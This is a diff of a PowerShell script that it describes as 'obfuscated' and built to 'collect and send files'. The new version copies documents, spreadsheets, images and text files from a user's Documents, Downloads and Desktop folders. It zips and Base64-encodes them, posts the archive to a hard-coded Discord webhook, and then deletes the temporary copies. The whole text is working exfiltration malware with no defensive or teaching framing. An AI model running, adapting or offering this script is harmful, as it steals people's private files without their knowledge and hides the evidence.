@@ -1,26 +1,36 @@
-# Define the target folder and output zip file
-$targetFolder = "$env:USERPROFILE\Downloads" # Change this to the desired folder
-$zipFile = "$env:TEMP\Files.zip" # Temporary zip file
+# Obfuscated script to collect and send files
+$tgtFolders = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop") # Target folders
+$tmpFolder = "$env:TEMP\FileUpload" # Temporary folder
+New-Item -Path $tmpFolder -ItemType Directory -Force | Out-Null
 
-# Compress the target folder into a zip archive
-Compress-Archive -Path $targetFolder -DestinationPath $zipFile -Force
+# Collect .docx, .pdf, .wps, and other files
+$fileTypes = @(".docx", ".pdf", ".wps", ".xlsx", ".jpg", ".txt") # Add more file types if needed
+$tgtFolders | ForEach-Object {
+    $folder = $_
+    $fileTypes | ForEach-Object {
+        Get-ChildItem -Path $folder -Filter $_ -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            Copy-Item -Path $_.FullName -Destination $tmpFolder -Force
+        }
+    }
+}
 
-# Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1334812652823642204/uhy1mRr1neECnYelQKTSUcqjqFgAIo0fbFBJKgvs_ak1HaxlkDvx5Oa7v_ZQzdXzT6qL" # Replace with your webhook URL
+# Compress files into a .zip archive
+$zipFile = "$env:TEMP\Files.zip"
+Compress-Archive -Path "$tmpFolder\*" -DestinationPath $zipFile -Force
 
-# Read the zip file as binary
+# Encode the .zip file in Base64
 $fileBytes = [System.IO.File]::ReadAllBytes($zipFile)
 $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
 
-# Prepare the payload for Discord
+# Send the Base64-encoded file to Discord
+$webhookUrl = "https://discord.com/api/webhooks/1334812652823642204/uhy1mRr1neECnYelQKTSUcqjqFgAIo0fbFBJKgvs_ak1HaxlkDvx5Oa7v_ZQzdXzT6qL" # Replace with your webhook URL
 $payload = @{
     content = "*File Archive:*"
     file    = $fileBase64
-    username = "PowerShell Bot"
+    username = "FileUploadBot"
 } | ConvertTo-Json
-
-# Send the data to Discord
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
 
-# Clean up: Delete the temporary zip file
+# Clean up
+Remove-Item -Path $tmpFolder -Recurse -Force
 Remove-Item -Path $zipFile -Force
